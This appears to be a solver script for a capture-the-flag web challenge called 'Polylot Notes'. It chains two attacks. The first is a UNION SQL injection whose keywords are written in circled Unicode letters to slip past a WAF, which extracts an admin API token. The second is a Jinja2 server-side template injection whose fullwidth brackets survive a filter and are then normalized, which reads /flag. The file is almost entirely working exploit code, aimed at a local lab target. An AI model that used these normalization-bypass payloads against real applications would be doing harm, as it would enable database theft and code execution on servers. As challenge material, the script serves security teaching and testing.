#!/usr/bin/env python3
"""
Polylot Notes — Operator Solver Script
=======================================

Usage:
    python3 solver.py [BASE_URL]

    BASE_URL defaults to: http://localhost:8004

Flow:
    1. 일반 사용자 계정 생성
    2. 로그인 → 세션 쿠키 취득
    3. Stage 1: /api/notes/search UNION SQLi (Circled Letters WAF bypass)
               → admin_sessions.api_token 추출
    4. Stage 2: /admin/render SSTI (Fullwidth brackets filter bypass)
               → /flag 파일 읽기
    5. 플래그 출력
"""
import sys
import time
import random
import string
import unicodedata
import urllib.request
import urllib.parse
import urllib.error
import json
import http.cookiejar

BASE_URL = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'http://localhost:8004'

# ────────────────────────────────────────────────────────────────
# Helper: Circled Latin Letter encoder
# ────────────────────────────────────────────────────────────────

_CIRCLED_UPPER = {chr(ord('A') + i): chr(0x24B6 + i) for i in range(26)}
_CIRCLED_LOWER = {chr(ord('a') + i): chr(0x24D0 + i) for i in range(26)}
_CIRCLED       = {**_CIRCLED_UPPER, **_CIRCLED_LOWER}


def circled(s: str) -> str:
    """ASCII 알파벳을 Circled Latin Letter로 인코딩."""
    return ''.join(_CIRCLED.get(c, c) for c in s)


# ────────────────────────────────────────────────────────────────
# HTTP client with cookie support
# ────────────────────────────────────────────────────────────────

class Client:
    def __init__(self, base: str):
        self.base   = base
        self.jar    = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar)
        )

    def post(self, path: str, data: dict, *, headers: dict | None = None) -> dict:
        url     = self.base + path
        payload = urllib.parse.urlencode(data).encode()
        req     = urllib.request.Request(url, data=payload, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        try:
            with self.opener.open(req) as resp:
                body = resp.read().decode('utf-8', errors='replace')
                ct   = resp.headers.get('Content-Type', '')
                return json.loads(body) if 'json' in ct else {'_body': body, '_status': resp.status}
        except urllib.error.HTTPError as e:
            body = e.read().decode('utf-8', errors='replace')
            try:
                return json.loads(body)
            except Exception:
                return {'_error': str(e), '_body': body}

    def get(self, path: str, params: dict | None = None, *, headers: dict | None = None) -> dict | list:
        url = self.base + path
        if params:
            url += '?' + urllib.parse.urlencode(params, quote_via=urllib.parse.quote)
        req = urllib.request.Request(url)
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        try:
            with self.opener.open(req) as resp:
                body = resp.read().decode('utf-8', errors='replace')
                ct   = resp.headers.get('Content-Type', '')
                return json.loads(body) if 'json' in ct else {'_body': body, '_status': resp.status}
        except urllib.error.HTTPError as e:
            body = e.read().decode('utf-8', errors='replace')
            try:
                return json.loads(body)
            except Exception:
                return {'_error': str(e), '_body': body}


# ────────────────────────────────────────────────────────────────
# Main exploit
# ────────────────────────────────────────────────────────────────

def rand_str(n: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=n))


def banner(title: str) -> None:
    print(f"\n{'─'*60}")
    print(f"  {title}")
    print(f"{'─'*60}")


def main() -> None:
    print(f"[*] Target: {BASE_URL}")

    client = Client(BASE_URL)

    # ── Step 0: 서비스 응답 확인 ─────────────────────────────────
    banner("Step 0: Connectivity check")
    resp = client.get('/')
    if '_error' in resp:
        print(f"[!] Cannot reach {BASE_URL}: {resp['_error']}")
        sys.exit(1)
    print(f"[+] Service is up.")

    # ── Step 1: 계정 생성 ────────────────────────────────────────
    banner("Step 1: Register solver account")
    suffix = rand_str(6)
    email  = f"solver_{suffix}@pwn.local"
    pw     = rand_str(12) + "A1!"
    resp = client.post('/auth/register', {
        'email':        email,
        'display_name': 'solver',
        'password':     pw,
    })
    print(f"[+] Registered: {email}")

    # ── Step 2: 로그인 ──────────────────────────────────────────
    banner("Step 2: Login")
    resp = client.post('/auth/login', {'email': email, 'password': pw})
    # 쿠키가 자동 저장됨; dashboard redirect == 로그인 성공
    print(f"[+] Login OK. Session cookie set.")

    # ── Step 3: Stage 1 SQLi ────────────────────────────────────
    banner("Step 3: Stage 1 — UNION SQLi via Circled Letters WAF bypass")

    u    = circled('union')
    s    = circled('select')
    q_raw = f"' AND 0 {u} {s} 1,api_token,3,4 from admin_sessions-- -"
    q_nfkc = unicodedata.normalize('NFKC', q_raw)

    print(f"[*] Raw payload  : {q_raw}")
    print(f"[*] NFKC decoded : {q_nfkc}")

    rows = client.get('/api/notes/search', {'q': q_raw})

    if isinstance(rows, dict) and 'error' in rows:
        print(f"[!] Search error: {rows['error']}")
        sys.exit(1)

    if not rows:
        print("[!] No rows returned. Check column count / table name.")
        sys.exit(1)

    admin_token = rows[0].get('title', '')
    print(f"[+] admin_sessions.api_token = {admin_token!r}")

    if not admin_token:
        print("[!] Token extraction failed (empty title field).")
        sys.exit(1)

    # ── Step 4: Stage 2 SSTI ────────────────────────────────────
    banner("Step 4: Stage 2 — SSTI via Fullwidth brackets filter bypass")

    # 필터는 ASCII { } < > [ ] | ' " \ ` 를 차단.
    # NFKC 정규화 후 ASCII로 변환되는 Fullwidth 문자로 우회:
    #   ｛ (U+FF5B) → {     ｝ (U+FF5D) → }     ＇ (U+FF07) → '
    #
    # 최종 Jinja2 페이로드:
    #   {{lipsum.__globals__.__builtins__.open('/flag').read()}}

    FF_LB  = '\uFF5B'   # ｛
    FF_RB  = '\uFF5D'   # ｝
    FF_AP  = '\uFF07'   # ＇

    payload_raw = (
        f"{FF_LB}{FF_LB}"
        f"lipsum.__globals__.__builtins__.open({FF_AP}/flag{FF_AP}).read()"
        f"{FF_RB}{FF_RB}"
    )
    payload_nfkc = unicodedata.normalize('NFKC', payload_raw)

    print(f"[*] Raw payload  : {payload_raw}")
    print(f"[*] NFKC decoded : {payload_nfkc}")

    resp = client.get(
        '/admin/render',
        {'content': payload_raw, 'lang': 'en'},
        headers={'X-Admin-Token': admin_token},
    )

    if isinstance(resp, dict) and 'error' in resp:
        print(f"[!] Admin render error: {resp['error']}")
        sys.exit(1)

    output = resp.get('output', '')
    print(f"[+] Render output: {output}")

    # ── Step 5: 플래그 추출 ─────────────────────────────────────
    banner("Step 5: Flag")

    import re
    flag_match = re.search(r'CTF\{[^}]+\}', output)
    if flag_match:
        print(f"\n  ★  FLAG: {flag_match.group()}  ★\n")
    else:
        print(f"[?] Flag pattern not found in output. Full output:")
        print(f"    {output}")


if __name__ == '__main__':
    main()
